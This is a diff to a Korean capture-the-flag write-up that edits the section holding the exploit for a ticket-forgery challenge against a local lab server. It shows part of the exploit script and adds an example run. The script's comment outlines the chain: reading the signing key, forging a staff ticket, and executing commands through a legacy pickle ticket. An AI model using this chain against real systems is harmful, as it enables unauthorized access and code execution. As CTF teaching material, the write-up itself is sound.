@@ -118,8 +118,6 @@ $ python3 exploit.py http://127.0.0.1:8009
 
 ## 7. 익스플로잇 코드
 
-같은 폴더의 [exploit.py](exploit.py) 와 같습니다.
-
 ```python
 #!/usr/bin/env python3
 # hard-06 (초대권) - 키 파일 읽기 -> staff 초대권 위조 -> 옛 초대권(pickle)으로 명령 실행 -> 금고 읽기
@@ -174,4 +172,13 @@ legacy = "v1." + legacy_body + "." + sign(secret, legacy_body)
 r = requests.post(f"{BASE}/admin/checkin", cookies=staff, data={"ticket": legacy})
 flag = re.search(r"GlassHouse\{[^}]*\}", r.text)
 print(f"[+] FLAG: {flag.group(0)}" if flag else "[-] 실패")
+```
+
+실행 예시
+
+```bash
+$ python3 exploit.py http://127.0.0.1:8009
+[*] 서명 키 획득
+[*] /admin: 200
+[+] FLAG: GlassHouse{...}
 ```
